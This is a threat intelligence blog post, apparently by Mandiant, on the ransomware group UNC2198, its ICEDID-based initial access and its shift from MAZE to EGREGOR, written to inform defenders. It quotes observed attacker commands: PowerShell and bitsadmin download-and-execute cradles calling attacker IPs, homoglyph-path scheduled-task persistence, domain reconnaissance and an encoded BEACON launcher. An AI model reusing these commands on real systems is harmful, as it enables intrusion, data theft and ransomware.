Uncategorized Groups (UNC Groups)
Threat Research
Mandiant Advanced Practices (AP) closely tracks the shifting tactics, techniques, and procedures (TTPs) of financially
motivated groups who severely disrupt organizations with ransomware. In May 2020, FireEye released a blog post
detailing intrusion tradecraft associated with the deployment of MAZE. As of publishing this post, we track 11 distinct
groups that have deployed MAZE ransomware. At the close of 2020, we noticed a shift in a subset of these groups that
have started to deploy EGREGOR ransomware in favor of MAZE ransomware following access acquired from ICEDID
infections.
Since its discovery in 2017 as a banking trojan, ICEDID evolved into a pernicious point of entry for financially motivated
actors to conduct intrusion operations. In earlier years, ICEDID was deployed to primarily target banking credentials. In
2020 we observed adversaries using ICEDID more explicitly as a tool to enable access to impacted networks, and in
many cases this was leading to the use of common post-exploitation frameworks and ultimately the deployment of
ransomware. This blog post shines a heat lamp on the latest tradecraft of UNC2198, whoused ICEDID infections to
deploy MAZE or EGREGOR ransomware.
Building an Igloo: ICEDID Infections
Separate phases of intrusions are attributed to different uncategorized (UNC) groups when discrete operations such as
obtaining access are not part of a contiguous operation. Pure “access operations” establish remote access into a target
environment for follow on operations actioned by a separate group. A backdoor deployed to establish an initial foothold
for another group is an example of an access operation.
Between July and December 2020, an ICEDID phishing infection chain consisted of a multi-stage process involving
MOUSEISLAND and PHOTOLOADER (Figure 1).

Figure 1: Example UNC2420 MOUSEISLAND to ICEDID Infection Chain

MOUSEISLAND is a Microsoft Word macro downloader used as the first infection stage and is delivered inside a
password-protected zip attached to a phishing email (Figure 2). Based on our intrusion data from responding to ICEDID
related incidents, the secondary payload delivered by MOUSEISLAND has been PHOTOLOADER, which acts as an
intermediary downloader to install ICEDID. Mandiant attributes the MOUSEISLAND distribution of PHOTOLOADER
and other payloads to UNC2420, a distribution threat cluster created by Mandiant’s Threat Pursuit team. UNC2420
activity shares overlaps with the publicly reported nomenclature of “Shathak” or “TA551”.

Ice, Ice, BEACON...UNC2198
Although analysis is always ongoing, at the time of publishing this blog post, Mandiant tracks multiple distinct threat
clusters (UNC groups) of various sizes that have used ICEDID as a foothold to enable intrusion operations. The most
prominent of these threat clusters is UNC2198, a group that has targeted organizations in North America across a

2/15

breadth of industries. In at least five cases, UNC2198 acquired initial access from UNC2420 MOUSEISLAND to conduct
intrusion operations. In 2020, Mandiant attributed nine separate intrusions to UNC2198. UNC2198’s objective is to
monetize their intrusions by compromising victim networks with ransomware.In July 2020, Mandiant observed
UNC2198 leverage network access provided by an ICEDID infection to encrypt an environment with MAZE ransomware.
As the year progressed into October and November, we observed UNC2198 shift from deploying MAZE to using
EGREGOR ransomware during another Incident Response engagement. Like MAZE, EGREGOR is operated using an
affiliate model, where affiliates who deploy EGREGOR are provided with proceeds following successful encryption and
extortion for payment.
The UNC2198 cluster expanded over the course of more than six months. Mandiant’s December 2020 blog post on UNCs
described the analytical tradecraft we use to merge and graduate clusters of activity. Merging UNCs is a substantial
analytical practice in which indicators and tradecraft attributed to one group are scrutinized against another. Two former
UNCs that shared similar modus operandi were eventually merged into UNC2198.
The Snowball Effect of Attribution
AP created UNC2198 based on a single intrusion in June 2020 involving ICEDID, BEACON, SYSTEMBC and WINDARC.
UNC2198 compromised 32 systems in 26 hours during this incident; however, ransomware was not deployed.
Throughout July 2020 we attributed three intrusions to UNC2198 from Incident Response engagements, including one
resulting in the deployment of MAZE ransomware. In October 2020, a slew of activity at both Incident Response
engagements and Managed Defense clients resulted in the creation of two new UNC groups, and another incident
attributed to UNC2198.
One of the new UNC groups created in October 2020 was given the designation UNC2374. UNC2374 began as its own
distinct cluster where BEACON, WINDARC, and SYSTEMBC were observed during an incident at a Managed Defense
customer. Initial similarities in tooling did not constitute a strong enough link to merge UNC2374 with UNC2198 yet.
Two and a half months following the creation of UNC2374, we amassed enough data points to merge UNC2374 into
UNC2198. Some of the data points used in merging UNC2374 into UNC2198 include:
UNC2198 and UNC2374 Cobalt Strike Team Servers used self-signed certificates with the following subject on TCP
port 25055:
C = US, ST = CA, L = California, O = Oracle Inc, OU = Virtual Services, CN = oracle.com

UNC2198 and UNC2374 deployed WINDARC malware to identical file paths: %APPDATA%\teamviewers\msi.dll
The same code signing certificate used to sign an UNC2198 BEACON loader was used to sign two UNC2374
SYSTEMBC tunneler payloads.
UNC2374 and UNC2198 BEACON C2 servers were accessed by the same victim system within a 10-minute time
window during intrusion operations.
The other UNC group created in October 2020 was given the designation UNC2414. Three separate intrusions were
attributed to UNC2414, and as the cluster grew, we surfaced similarities between UNC2414 and UNC2198. A subset of
the data points used to merge UNC2414 into UNC2198 include:
UNC2198 and UNC2414 BEACON servers used self-signed certificates using the following subject on TCP port
25055:
C = US, ST = CA, L = California, O = Oracle Inc, OU = Virtual Services, CN = oracle.com

UNC2198 and UNC2414 installed BEACON as C:\Windows\int32.dll
UNC2198 and UNC2414 installed the RCLONE utility as C:\Perflogs\rclone.exe
UNC2198 and UNC2414 were proven to be financially motivated actors that had leveraged ICEDID as initial access:
UNC2198 had deployed MAZE
UNC2414 had deployed EGREGOR

3/15

The merge between UNC2198 and UNC2414 was significant because it revealed UNC2198 has access to EGREGOR
ransomware. The timing of the EGREGOR usage is also consistent with MAZE ransomware shutting down as reported by
Mandiant Intelligence. Figure 3 depicts the timeline of related intrusions and merges into UNC2198.

Figure 3: UNC2198 timeline

UNC2198 Intrusion Flow: After Initial Access
Expanding the UNC2198 cluster through multiple intrusions and merges with other UNC groups highlights the range of
TTPs employed. We have pulled out some key data from all our UNC2198 intrusions to illustrate an amalgamation of
capabilities used by the threat actor.
Establish Foothold
After obtaining access, UNC2198 has deployed additional malware using various techniques. For instance, UNC2198
used InnoSetup droppers to install a WINDARC backdoor on the target host. UNC2198 also used BITS Jobs and remote
PowerShell downloads to download additional tools like SYSTEMBC for proxy and tunneler capabilities. Example
commands for download and execution are:
%COMSPEC% /C echo bitsadmin /transfer 257e http://<REDACTED>/<REDACTED>.exe %APPDATA%
<REDACTED>.exe & %APPDATA%<REDACTED>.exe & del %APPDATA% <REDACTED>.exe ^>
%SYSTEMDRIVE%\WINDOWS\Temp\FmpaXUHFennWxPIM.txt > \WINDOWS\Temp\MwUgqKjEDjCMDGmC.bat &
%COMSPEC% /C start %COMSPEC% /C \WINDOWS\Temp\MwUgqKjEDjCMDGmC.bat
%COMSPEC% /C echo powershell.exe -nop -w hidden -c (new-object
System.Net.WebClient).Downloadfile(http://<REDACTED>/<REDACTED>.exe, <REDACTED>.exe) ^>
%SYSTEMDRIVE%\WINDOWS\Temp\AVaNbBXzKyxktAZI.txt > \WINDOWS\Temp\yoKjaqTIzJhdDLjD.bat &
%COMSPEC% /C start %COMSPEC% /C \WINDOWS\Temp\yoKjaqTIzJhdDLjD.bat

UNC2198 has used Cobalt Strike BEACON, Metasploit METERPRETER, KOADIC, and PowerShell EMPIREoffensive
security toolsduring this phase as well.
Offensive Security Tooling
UNC2198 has used offensive security tools similarly seen across many threat actors. UNC2198 has used BEACON in
roughly 90% of their intrusions. UNC2198 installs and executes Cobalt Strike BEACON in a variety of ways, including
shellcode loaders using PowerShell scripts, service executables, and DLLs. While the ways and means of using BEACON
are not inherently unique, there are still aspects to extrapolate that shed light on UNC2198 TTPs.
Focusing in on specific BEACON executables tells a different story beyond the use of the tool itself. Aside from junk code
and API calls, UNC2198 BEACON and METERPRETER executables often exhibit unique characteristics of malware
packaging, including odd command-line arguments visible within strings and upon execution via child processes:

4/15

cmd.exe /c echo TjsfoRdwOe=9931 & reg add HKCU\SOFTWARE\WIlumYjNSyHob /v xFCbJrNfgBNqRy /t
REG_DWORD /d 3045 & exit
cmd.exe /c echo ucQhymDRSRvq=1236 & reg add HKCU\\SOFTWARE\\YkUJvbgwtylk /v KYIaIoYxqwO /t
REG_DWORD /d 9633 & exit
cmd.exe /c set XlOLqhCejHbSNW=8300 & reg add HKCU\SOFTWARE\WaMgGneKhtgTTy /v LbmWADsevLywrkP /t
REG_DWORD /d 3809 & exit

These example commands are non-functional, as they do not modify or alter payload execution.
Another technique involves installing BEACON using a file path containing mixed Unicode-escaped and ASCII
characters to evade detection:
Unicode Escaped

C:\ProgramData\S\u0443sH\u0435\u0430ls\T\u0430s\u0441host.exe

Unicode Unescaped

C:\ProgramData\SуsHеаls\Tаsсhost.exe

The executable was then executed by using a Scheduled Task named shadowdev:
cmd.exe /c schtasks /create /sc minute /mo 1 /tn shadowdev /tr
C:\\ProgramData\\S\u0443sH\u0435\u0430ls\\T\u0430s\u0441host.exe

While the previous examples are related to compiled executables, UNC2198 has also used simple PowerShell download
cradles to execute Base64-encoded and compressed BEACON stagers in memory:
powershell -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://5.149.253[.]199:80/auth'))
powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring("hxxp://185.106.122[.]167:80/a"))
powershell.exe -nop -w hidden -c "IEX ((new-object
net.webclient).downloadstring('hxxp://195.123.233[.]157:80/casino'))"

Discovery and Reconnaissance
UNC2198 has exhibited common TTPs seen across many threat groups during discovery and reconnaissance activities.
UNC2198 has used the BloodHound active directory mapping utilityduring intrusions from within the “C:\ProgramData”
and “C:\Temp” directories.
The following are collective examples of various commands executed by UNC2198 over time to enumerate a
compromised environment:
arp -a
whoami /groups
whoami.exe /groups /fo csv
whoami /all
net user <Redacted>
net groups "Domain Admins" /domain
net group "Enterprise admins" /domain
net group "local admins" /domain
net localgroup "administrators" /domain
nltest /domain_trusts
nltest /dclist:<Redacted>

5/15

Lateral Movement and Privilege Escalation
UNC2198 has used Windows Remote Management and RDP to move laterally between systems. UNC2198 has also
performed remote execution of BEACON service binaries on targeted systems to move laterally. UNC2198 launches SMB
BEACON using PowerShell, executing command lines such as the following:
C:\WINDOWS\system32\cmd.exe /b /c start /b /min powershell -nop -w hidden -encodedcommand
JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALAB

MASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwA3ADIALw...<Truncated>

During one intrusion, UNC2198 used the SOURBITS privilege escalation utility to execute files on a target system.
SOURBITS is a packaged exploit utility for CVE-2020-0787, which is a vulnerability that was disclosed in 2020 for
Windows Background Intelligent Transfer Service (BITS). SOURBITS consists of code derived from a GitHub
Repository that is implemented as a command-line utility, which can execute arbitrary files with elevated privileges.
UNC2198 used SOURBITS with the following components:
C:\Users\<User>\Downloads\runsysO.cr
C:\Users\<User>\Downloads\starterO.exe
The file runsysO.cr is an XOR-encoded PE executable that exploits CVE-2020-0787, and based on the target system's
bitness, it will drop one of two embedded SOURBITS payloads.
Data Theft, Ransomware Deployment and #TTR
Like other financially motivated threat actors, part of UNC2198’s modus operandi in latter stages of intrusions involves
the exfiltration of hundreds of gigabytes of the victim organizations’ data before ransomware is installed. Specifically,
UNC2198 has used RCLONE, a command line utility used to synchronize cloud storage, to aid in the exfiltration of
sensitive data. In all observed cases of data theft, RCLONE was used by UNC2198 from the “C:\PerfLogs\rclone.exe” file
path.
“Time-to-Ransom" (TTR) is the delta between first-attributed access time and the time of ransomware deployment. TTR
serves as a useful gauge of how quickly an organization needs to respond to stave off a threat actor’s successful
deployment of ransomware. TTR is not a perfect quantification, as external factors such as an organization’s security
posture can drastically affect the measurement.
In this post, the TTR of UNC2198 is measured between ICEDID activity to the deployment of ransomware. In July 2020,
UNC2198 deployed MAZE ransomware using PSEXEC, and the TTR was 5.5 days. In October 2020, UNC2198 deployed
EGREGOR ransomware using forced GPO updates, and the TTR was 1.5 days.
Looking Forward
Threat actors leveraging access obtained through mass malware campaigns to deploy ransomware is a growing trend.
The efficiency of ransomware groups places a significant burden on defenders to rapidly respond before ransomware
deployment. As ransomware groups continue to gain operational expertise through successful compromises, they will
continue to shorten their TTR while scaling their operations. Understanding the TTPs fundamental to a specific
operation like UNC2198 provides an edge to defenders in their response efforts. Our unparalleled understanding of
groups like UNC2198 is translated into Mandiant Advantage. Accessing our holdings in Mandiant Advantage aids
defenders in recognizing TTPs used by threat actors, assessing organizational risk, and taking action. Initial investments
made into rapidly assessing a group’s modus operandi pays dividends when they inevitably evolve and swap out
components of their toolset. Whether it be MAZE or EGREGOR, something icy or hot, Advanced Practices will continue
to pursue these unchill threat actors.

Appendix: Malware Families
PHOTOLOADER is a downloader that has been observed to download ICEDID. It makes an HTTP request for a fake
image file, which is RC4 decrypted to provide the final payload. Host information is sent to the command and control
(C2) via HTTP cookies. Samples have been observed to contain an embedded C2 configuration that contain the real C2
with a number of non-malicious domains. The non-malicious domains are contacted in addition to the real C2.
WINDARC is a backdoor that hijacks the execution of TeamViewer to perform C2 communication. It supports plugins
and accepts several backdoor commands. The commands include interacting with the TeamViewer tool, starting a
reverse shell, loading new plugins, downloading and executing files, and modifying configuration settings.
SYSTEMBC is a proxy malware that beacons to its C2 and opens new proxy connections between the C2 and remote
hosts as indicated by the C2. Proxied communications are encrypted with RC4. The malware receives commands via
HTTP and creates new proxy connections as directed. Underground sales advertisements refer to the software as a
“socks5 backconnect system”. The malware is typically used to hide the malicious traffic associated with other malware.
